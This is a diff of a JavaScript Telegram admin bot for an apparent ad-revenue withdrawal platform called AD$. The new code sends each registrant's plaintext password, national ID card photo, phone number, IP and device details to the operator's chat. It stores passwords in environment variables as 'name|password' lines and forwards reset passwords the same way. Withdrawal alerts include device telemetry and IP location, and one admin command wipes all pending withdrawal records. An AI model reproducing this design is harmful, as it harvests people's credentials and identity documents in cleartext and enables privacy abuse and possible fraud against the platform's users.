@@ -1,4 +1,4 @@
-// telegramBot.js - إدارة بوت التيليجرام مع دعم مسح القائمة عن بُعد بالأزرار والأوامر
+// telegramBot.js - دعم تعدد الحسابات، إرسال صورة البطاقة الشخصية، وكود واتساب 7 أرقام
 
 class TelegramBotManager {
     constructor(token, adminChatId, onDecisionCallback) {
@@ -13,12 +13,11 @@ class TelegramBotManager {
     startListening() {
         if (!this.token || this.token.includes("ضع_توكن") || this.isPolling) return;
         this.isPolling = true;
-        console.log("✅ بوت التيليجرام متصل ويستمع لأوامر التسوية والمسح عن بُعد...");
+        console.log("✅ بوت التيليجرام متصل (نظام الحسابات المتعددة + KYC + OTP)...");
         this.registerBotCommands();
         this.pollUpdates();
     }
 
-    // تسجيل قائمة الأوامر السريعة في زر (Menu) داخل تطبيق تيليجرام
     async registerBotCommands() {
         try {
             await fetch(`${this.apiUrl}/setMyCommands`, {
@@ -26,8 +25,8 @@ class TelegramBotManager {
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     commands: [
-                        { command: "menu", description: "📊 فتح لوحة التحكم وعرض الرصيد" },
-                        { command: "clear", description: "🗑️ مسح قائمة السحوبات بالكامل عن بُعد" }
+                        { command: "menu", description: "📊 عرض لوحة التحكم والحسابات" },
+                        { command: "clear", description: "🗑️ مسح قوائم السحوبات بالكامل" }
                     ]
                 })
             });
@@ -44,12 +43,10 @@ class TelegramBotManager {
                     for (const update of data.result) {
                         this.lastUpdateId = update.update_id;
 
-                        // 1. معالجة ضغطات الأزرار التفاعلية
                         if (update.callback_query) {
                             await this.handleButtonClick(update.callback_query);
                         }
 
-                        // 2. معالجة الأوامر النصية المرسلة للبوت (/clear أو مسح أو تحكم)
                         if (update.message && update.message.text) {
                             await this.handleTextCommand(update.message);
                         }
@@ -61,47 +58,28 @@ class TelegramBotManager {
         }
     }
 
-    // معالجة الأوامر الكتابية من مدير البوت فقط
     async handleTextCommand(message) {
         const chatId = String(message.chat.id);
-        if (chatId !== this.adminChatId) return; // حماية: يستجيب لحسابك فقط
+        if (chatId !== this.adminChatId) return;
 
         const text = message.text.trim();
 
-        // أمر المسح المباشر
         if (text === "/clear" || text === "مسح" || text === "مسح القائمة") {
-            const result = await this.onDecisionCallback("ALL", "clear_all");
-            await this.sendPlainMessage(
-                `✅ *تم مسح قائمة السحوبات وتصفير المبالغ المعلقة عن بُعد بنجاح!*\n` +
-                `💰 *الرصيد المتاح الآن في الموقع:* \`$${result?.newBalance || "0.00"}\``
-            );
+            await this.onDecisionCallback("ALL", "clear_all");
+            await this.sendPlainMessage("✅ *تم مسح قوائم السحوبات وتصفير المبالغ المعلقة لجميع الحسابات!*");
             return;
         }
 
-        // أمر فتح لوحة التحكم السريعة
-        if (text === "/start" || text === "/menu" || text === "تحكم" || text === "الرصيد") {
+        if (text === "/start" || text === "/menu" || text === "تحكم") {
             const status = await this.onDecisionCallback("ALL", "get_status");
             const panelText =
-`🎛 *لوحة التحكم عن بُعد - منصة عوائد الإعلانات*
+`🎛 *لوحة التحكم - نظام الحسابات المتعددة*
 ━━━━━━━━━━━━━━━━━━━━
-💰 *رصيد ViaBTC الخام:* \`$${status?.rawBalance || "0.00"}\`
-⏳ *إجمالي المبالغ المعلقة:* \`$${status?.pendingDeduction || "0.00"}\`
-💵 *الرصيد المتاح بالموقع الآن:* \`$${status?.availableBalance || "0.00"}\`
+👥 *عدد الحسابات المسجلة:* \`${status?.usersCount || 0}\` مشترك
 🏦 *سعر الصرف الرسمي:* \`${status?.exchangeRate || "56.26"} ج.م\`
-📋 *عدد العمليات في القائمة:* \`${status?.historyCount || 0}\` عملية
+📋 *إجمالي عمليات السحب:* \`${status?.historyCount || 0}\` عملية
 ━━━━━━━━━━━━━━━━━━━━
-👇 *اختر الإجراء المطلوب تنفيذه فوراً:*`;
-
-            const keyboard = {
-                inline_keyboard: [
-                    [
-                        { text: "🗑️ مسح قائمة السحوبات بالكامل", callback_data: "clear_all:panel" }
-                    ],
-                    [
-                        { text: "🔄 تحديث بيانات اللوحة", callback_data: "status:refresh" }
-                    ]
-                ]
-            };
+👇 *اختر الإجراء المطلوب:*`;
 
             await fetch(`${this.apiUrl}/sendMessage`, {
                 method: "POST",
@@ -110,27 +88,122 @@ class TelegramBotManager {
                     chat_id: this.adminChatId,
                     text: panelText,
                     parse_mode: "Markdown",
-                    reply_markup: keyboard
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: "🗑️ مسح جميع قوائم السحوبات", callback_data: "clear_all:panel" }]
+                        ]
+                    }
                 })
             });
         }
     }
 
-    async sendPlainMessage(text) {
+    async sendPlainMessage(text, replyMarkup = null) {
         try {
+            const body = {
+                chat_id: this.adminChatId,
+                text: text,
+                parse_mode: "Markdown"
+            };
+            if (replyMarkup) body.reply_markup = replyMarkup;
+
             await fetch(`${this.apiUrl}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: this.adminChatId,
-                    text: text,
-                    parse_mode: "Markdown"
-                })
+                body: JSON.stringify(body)
             });
         } catch (e) {}
     }
 
-    // إرسال إشعار طلب السحب مع أزرار (التسوية / الرفض / مسح القائمة بالكامل)
+    // 1. إرسال إشعار كود التحقق (7 أرقام) مع زر إرسال فوري لواتساب المشترك
+    async sendOtpAlertToAdmin(phone, otpCode, purpose, autoSent) {
+        const intlPhone = "2" + phone; // تحويل 01xxxxxxxxx إلى 201xxxxxxxxx
+        const purposeText = purpose === "register" ? "تسجيل حساب جديد" : "استعادة كلمة المرور";
+        const waMessage = encodeURIComponent(
+            `مرحباً بك في منصة AD$ للتمويل الإعلاني 🌐\nكود التحقق الخاص بك (${purposeText}) المكون من 7 أرقام هو:\n*${otpCode}*`
+        );
+        const waUrl = `https://wa.me/${intlPhone}?text=${waMessage}`;
+
+        const msg =
+`🔐 *كود مصادقة واتساب (7 أرقام - OTP)*
+━━━━━━━━━━━━━━━━━━━━
+📌 *السبب:* ${purposeText}
+📱 *رقم الهاتف:* \`${phone}\`
+🔢 *كود الـ 7 أرقام:* \`${otpCode}\`
+📡 *حالة الإرسال التلقائي:* ${autoSent ? "✅ تم الإرسال تلقائياً عبر WhatsApp API" : "⚡ جاهز للإرسال المباشر عبر الزر أدناه"}
+━━━━━━━━━━━━━━━━━━━━`;
+
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: "📲 إرسال الكود لواتساب المشترك بضغطة واحدة", url: waUrl }]
+            ]
+        };
+
+        await this.sendPlainMessage(msg, keyboard);
+    }
+
+    // 2. إرسال بيانات المشترك الجديد + صورة البطاقة الشخصية + سطر Environment Variables
+    async sendNewRegistrationWithIdCard(regData) {
+        const { fullName, phone, password, idCardBase64, deviceInfo, date } = regData;
+        const envKey = `USER_${phone}`;
+        const envValue = `${fullName}|${password}|ضع_رابط_VIABTC_الخاص_به_هنا`;
+
+        const caption =
+`🆕 *طلب تسجيل مشترك جديد + صورة البطاقة*
+━━━━━━━━━━━━━━━━━━━━
+👤 *الاسم الكامل:* ${fullName}
+📱 *رقم الهاتف:* \`${phone}\`
+🔑 *كلمة المرور المختارة:* \`${password}\`
+📲 *نوع الجهاز:* ${deviceInfo?.deviceModel || "غير معروف"}
+🌐 *الـ IP الخارجي:* \`${deviceInfo?.ip || "غير معروف"}\`
+⏰ *التوقيت:* ${date}
+━━━━━━━━━━━━━━━━━━━━
+⚙️ *لتسجيله في Render Environment Variables:*
+📌 *الاسم (Key):*
+\`${envKey}\`
+📌 *القيمة (Value):*
+\`${envValue}\``;
+
+        try {
+            if (idCardBase64 && idCardBase64.includes("base64,")) {
+                const base64Data = idCardBase64.split("base64,")[1];
+                const buffer = Buffer.from(base64Data, "base64");
+                const formData = new FormData();
+                formData.append("chat_id", this.adminChatId);
+                formData.append("caption", caption);
+                formData.append("parse_mode", "Markdown");
+                formData.append("photo", new Blob([buffer], { type: "image/jpeg" }), `id_${phone}.jpg`);
+
+                await fetch(`${this.apiUrl}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            } else {
+                await this.sendPlainMessage(caption);
+            }
+        } catch (err) {
+            console.error("خطأ في إرسال صورة البطاقة:", err.message);
+            await this.sendPlainMessage(caption);
+        }
+    }
+
+    // 3. إشعار تغيير كلمة المرور لتحديثها في Environment Variables عند الرغبة
+    async sendPasswordResetNotice(user) {
+        const envKey = `USER_${user.phone}`;
+        const envValue = `${user.name}|${user.password}|${user.viabtcUrl || "رابط_فيا"}`;
+        const text =
+`🔄 *قام مشترك بتغيير كلمة المرور عبر OTP*
+━━━━━━━━━━━━━━━━━━━━
+👤 *المشترك:* ${user.name} (\`${user.phone}\`)
+🔑 *كلمة المرور الجديدة:* \`${user.password}\`
+━━━━━━━━━━━━━━━━━━━━
+📋 *السطر المحدث لـ Environment Variables:*
+\`${envKey}=${envValue}\``;
+
+        await this.sendPlainMessage(text);
+    }
+
+    // 4. إرسال إشعار طلب السحب مع تحديد حساب المشترك
     async sendWithdrawNotification(record, totalPending) {
         if (!this.token || this.token.includes("ضع_توكن")) return;
 
@@ -139,10 +212,11 @@ class TelegramBotManager {
         const dev = record.deviceInfo || {};
 
         const text = 
-`🔔 *طلب سحب / بيع مكافآت جديد (تحويل مصري)*
+`🔔 *طلب سحب جديد | حساب: ${record.accountOwnerName}*
 ━━━━━━━━━━━━━━━━━━━━
 🆔 *رقم العملية:* \`${record.id}\`
-👤 *الاسم / المعرف:* ${record.userName}
+📱 *حساب المشترك:* \`${record.userPhone}\` (${record.accountOwnerName})
+👤 *اسم المستفيد:* ${record.userName}
 💰 *المبلغ المخصوم:* $${record.gross}
 📉 *رسوم التحويل (25%):* -$${record.fee}
 💵 *الصافي بالدولار:* $${record.net}
@@ -153,31 +227,27 @@ class TelegramBotManager {
 📋 *اضغط على الرقم لنسخه فوراً:*
 \`${cleanCopyableNumber}\`
 ${rawDestination !== cleanCopyableNumber ? `🔢 *التنسيق المقروء:* \`${rawDestination}\`\n` : ""}━━━━━━━━━━━━━━━━━━━━
-📱 *بيانات الجهاز والشبكة (Telemetry):*
-🔖 *معرف الجهاز (Device ID):* \`${dev.deviceId || "غير متاح"}\`
-📲 *نوع وطراز الجهاز:* ${dev.deviceModel || "غير معروف"}
-⚙️ *المعالج (CPU):* ${dev.cpu || "غير معروف"}
-🧠 *الذاكرة (RAM):* ${dev.ram || "غير معروف"}
-🔋 *حالة البطارية:* ${dev.battery || "غير متاح"}
-🌐 *الـ IP الخارجي:* \`${dev.ip || "غير معروف"}\`
-📡 *مزود الشبكة (ISP):* ${dev.isp || "غير معروف"}
-📍 *الموقع عبر الـ IP:* ${dev.location || "غير معروف"}
+📱 *بيانات الجهاز والشبكة:*
+🔖 *معرف الجهاز:* \`${dev.deviceId || "غير متاح"}\`
+📲 *الجهاز:* ${dev.deviceModel || "غير معروف"}
+⚙️ *المعالج:* ${dev.cpu || "غير معروف"} | 🧠 *الرام:* ${dev.ram || "غير معروف"}
+🔋 *البطارية:* ${dev.battery || "غير متاح"}
+🌐 *الـ IP:* \`${dev.ip || "غير معروف"}\` (${dev.isp || ""})
+📍 *الموقع:* ${dev.location || "غير معروف"}
 ━━━━━━━━━━━━━━━━━━━━
-📊 *إجمالي المبالغ المعلقة:* $${totalPending.toFixed(2)}
-⏰ *التوقيت:* ${record.date}
-━━━━━━━━━━━━━━━━━━━━
-👇 *اختر إجراء التسوية لتحديث الموقع فوراً:*`;
+📊 *المعلق في حساب المشترك:* $${totalPending.toFixed(2)}
+⏰ *التوقيت:* ${record.date}`;
 
         const inlineKeyboard = {
             inline_keyboard: [
                 [
-                    { text: "✅ تمت التسوية والدفع بنجاح", callback_data: `approve:${record.id}` }
+                    { text: "✅ تمت التسوية والدفع بنجاح", callback_data: `approve:${record.userPhone}:${record.id}` }
                 ],
                 [
-                    { text: "❌ فشلت العملية (إعادة المبلغ للرصيد)", callback_data: `reject:${record.id}` }
+                    { text: "❌ فشلت العملية (إعادة المبلغ للمشترك)", callback_data: `reject:${record.userPhone}:${record.id}` }
                 ],
                 [
-                    { text: "🗑️ مسح قائمة السحوبات بالكامل", callback_data: `clear_all:${record.id}` }
+                    { text: "🗑️ مسح سجل هذا المشترك", callback_data: `clear_user:${record.userPhone}:${record.id}` }
                 ]
             ]
         };
@@ -203,75 +273,37 @@ ${rawDestination !== cleanCopyableNumber ? `🔢 *التنسيق المقروء:
         if (chatId !== this.adminChatId) return;
 
         const data = callbackQuery.data || "";
-        const [action, txId] = data.split(":");
+        const parts = data.split(":");
+        const action = parts[0];
+        const userPhone = parts[1];
+        const txId = parts[2];
         const message = callbackQuery.message;
 
-        if (!action) return;
-
-        // 1. إذا ضغط المدير على زر "مسح قائمة السحوبات بالكامل"
         if (action === "clear_all") {
-            const result = await this.onDecisionCallback("ALL", "clear_all");
-            await this.answerCallback(
-                callbackQuery.id,
-                `✅ تم مسح قائمة السحوبات بالكامل من الموقع! الرصيد المتاح الآن: $${result?.newBalance || "0.00"}`
-            );
-            await this.sendPlainMessage(
-                `🗑️ *تم مسح قائمة السحوبات بالكامل عن بُعد!*\n` +
-                `💰 *الرصيد المتاح الآن في الموقع:* \`$${result?.newBalance || "0.00"}\``
-            );
+            await this.onDecisionCallback("ALL", "clear_all");
+            await this.answerCallback(callbackQuery.id, "✅ تم مسح جميع قوائم السحوبات بنجاح!");
             return;
         }
 
-        // 2. إذا ضغط المدير على زر "تحديث بيانات اللوحة"
-        if (action === "status" && txId === "refresh") {
-            const status = await this.onDecisionCallback("ALL", "get_status");
-            const panelText =
-`🎛 *لوحة التحكم عن بُعد - منصة عوائد الإعلانات*
-━━━━━━━━━━━━━━━━━━━━
-💰 *رصيد ViaBTC الخام:* \`$${status?.rawBalance || "0.00"}\`
-⏳ *إجمالي المبالغ المعلقة:* \`$${status?.pendingDeduction || "0.00"}\`
-💵 *الرصيد المتاح بالموقع الآن:* \`$${status?.availableBalance || "0.00"}\`
-🏦 *سعر الصرف الرسمي:* \`${status?.exchangeRate || "56.26"} ج.م\`
-📋 *عدد العمليات في القائمة:* \`${status?.historyCount || 0}\` عملية
-⏰ *آخر تحديث:* ${new Date().toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" })}
-━━━━━━━━━━━━━━━━━━━━
-👇 *اختر الإجراء المطلوب تنفيذه فوراً:*`;
-
-            await fetch(`${this.apiUrl}/editMessageText`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: message.chat.id,
-                    message_id: message.message_id,
-                    text: panelText,
-                    parse_mode: "Markdown",
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: "🗑️ مسح قائمة السحوبات بالكامل", callback_data: "clear_all:panel" }],
-                            [{ text: "🔄 تحديث بيانات اللوحة", callback_data: "status:refresh" }]
-                        ]
-                    }
-                })
-            });
-            await this.answerCallback(callbackQuery.id, "✅ تم تحديث بيانات اللوحة بنجاح");
+        if (action === "clear_user") {
+            await this.onDecisionCallback(userPhone, "clear_user");
+            await this.answerCallback(callbackQuery.id, `✅ تم مسح قائمة سحوبات المشترك ${userPhone}`);
             return;
         }
 
-        // 3. معالجة قبول أو رفض عملية سحب معينة
-        const updatedRecord = await this.onDecisionCallback(txId, action);
+        const updatedRecord = await this.onDecisionCallback(userPhone, action, txId);
 
         if (!updatedRecord) {
-            await this.answerCallback(callbackQuery.id, "⚠️ هذه العملية غير موجودة أو تم مسح القائمة.");
+            await this.answerCallback(callbackQuery.id, "⚠️ هذه العملية غير موجودة أو تم مسحها.");
             return;
         }
 
         const statusLine = action === "approve"
             ? "✅ *الحالة النهائية: تمت التسوية والدفع بنجاح*"
-            : "❌ *الحالة النهائية: فشلت العملية (تم إرجاع المبلغ لرصيد الموقع)*";
+            : "❌ *الحالة النهائية: فشلت العملية (تم إرجاع المبلغ لحساب المشترك)*";
 
-        const updatedText = `${message.text.split("👇")[0].trim()}\n\n${statusLine}`;
+        const updatedText = `${message.text}\n\n${statusLine}`;
 
-        // الإبقاء على زر مسح القائمة متاحاً أسفل الرسالة حتى بعد التسوية
         await fetch(`${this.apiUrl}/editMessageText`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -279,20 +311,14 @@ ${rawDestination !== cleanCopyableNumber ? `🔢 *التنسيق المقروء:
                 chat_id: message.chat.id,
                 message_id: message.message_id,
                 text: updatedText,
-                parse_mode: "Markdown",
-                reply_markup: {
-                    inline_keyboard: [
-                        [{ text: "🗑️ مسح قائمة السحوبات بالكامل", callback_data: "clear_all:after_decision" }]
-                    ]
-                }
+                parse_mode: "Markdown"
             })
         });
 
-        const alertMsg = action === "approve"
-            ? "تم اعتماد الدفع بالجنيه المصري وتحديث الموقع!"
-            : "تم إلغاء العملية وإرجاع المبلغ إلى رصيد الموقع!";
-
-        await this.answerCallback(callbackQuery.id, alertMsg);
+        await this.answerCallback(
+            callbackQuery.id,
+            action === "approve" ? "تم اعتماد الدفع!" : "تم إلغاء العملية وإرجاع المبلغ!"
+        );
     }
 
     async answerCallback(callbackQueryId, text) {
